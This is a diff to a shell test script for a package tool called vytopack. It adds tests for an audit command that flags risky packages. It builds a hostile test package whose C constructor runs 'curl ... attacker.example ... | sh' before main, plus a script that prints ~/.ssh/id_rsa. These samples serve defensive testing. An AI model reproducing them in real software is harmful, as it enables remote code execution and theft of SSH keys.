@@ -284,6 +284,82 @@ got=$(cd "$TA/manual" && "$ROOT/vytoc" run main.vt 2>&1)
 check vytopack_manual_builds "value of k
 helper: 7" "$got"
 
+# --- audit --------------------------------------------------------------------
+#
+# A REPORT, not a verdict. The two failure modes that make such a tool useless
+# are both checked: crying wolf on a clean package (it gets disabled, and then
+# protects nobody), and staying quiet on a hostile one.
+#
+# The surface that matters is native/src/*.c, which vytoc compiles and links
+# automatically — a shim with a constructor runs before main() with no call
+# site. vytopack itself never runs code from a package.
+got=$(cd "$TA/proj" && "$PACK" audit 2>&1)
+case "$got" in
+    *"nothing flagged"*) echo "PASS vytopack_audit_clean" ;;
+    *) echo "FAIL vytopack_audit_clean (flagged a pure-Vyto package)"
+       printf '%s\n' "$got"; fail=1 ;;
+esac
+
+# A package that would own your machine, with every signal in one tree.
+mkdir -p "$TA/malpkg/native/src" "$TA/malpkg/lib"
+cat > "$TA/malpkg/native/src/shim.c" <<'CEOF'
+#include <stdlib.h>
+__attribute__((constructor)) static void boot(void) {
+    system("curl -s https://attacker.example/x | sh");
+}
+int pkg_add(int a, int b) { return a + b; }
+CEOF
+cat > "$TA/malpkg/lib/lib.vt" <<'VEOF'
+extern "C" { fn pkg_add(a: i32, b: i32): i32; }
+export fn add(a: int, b: int): int { return pkg_add(a as i32, b as i32) as int; }
+VEOF
+cat > "$TA/malpkg/grab.sh" <<'SEOF'
+#!/bin/sh
+cat ~/.ssh/id_rsa
+SEOF
+chmod +x "$TA/malpkg/grab.sh"
+(
+    cd "$TA/malpkg"
+    git init -q .
+    git config user.email t@example.com
+    git config user.name test
+    git add -A
+    git commit -qm v1
+    git tag v0.1.0
+) >/dev/null 2>&1
+
+mkdir -p "$TA/malapp"
+_out=$(cd "$TA/malapp" && "$PACK" install --url="file://$TA/malpkg" --rev=v0.1.0 2>&1)
+# install must still SUCCEED — refusing legitimate C shims is why such tools get
+# turned off — but it must say something at the moment trust is being decided.
+case "$_out" in
+    *"worth a look"*) echo "PASS vytopack_audit_install_hint" ;;
+    *) echo "FAIL vytopack_audit_install_hint"; printf '%s\n' "$_out"; fail=1 ;;
+esac
+
+_out=$(cd "$TA/malapp" && "$PACK" audit 2>&1)
+_miss=""
+for _sig in "compiles 1 native source file" "runs code before main" \
+            "executes a shell command" "references an .ssh path"; do
+    printf '%s' "$_out" | grep -q "$_sig" || _miss="$_miss [$_sig]"
+done
+if [ -z "$_miss" ]; then
+    echo "PASS vytopack_audit_hostile"
+else
+    echo "FAIL vytopack_audit_hostile missed:$_miss"; printf '%s\n' "$_out"; fail=1
+fi
+# and a warning must make the exit code non-zero, so CI can gate on it
+if (cd "$TA/malapp" && "$PACK" audit >/dev/null 2>&1); then
+    echo "FAIL vytopack_audit_exit (exit 0 despite warnings)"; fail=1
+else
+    echo "PASS vytopack_audit_exit"
+fi
+# line numbers make a finding actionable rather than a rumour
+case "$_out" in
+    *"native/src/shim.c:2"*) echo "PASS vytopack_audit_lineno" ;;
+    *) echo "FAIL vytopack_audit_lineno"; printf '%s\n' "$_out"; fail=1 ;;
+esac
+
 # --- refusals ----------------------------------------------------------------
 #
 # vyto/os's capture() is popen(3), so an unvalidated URL or rev would be
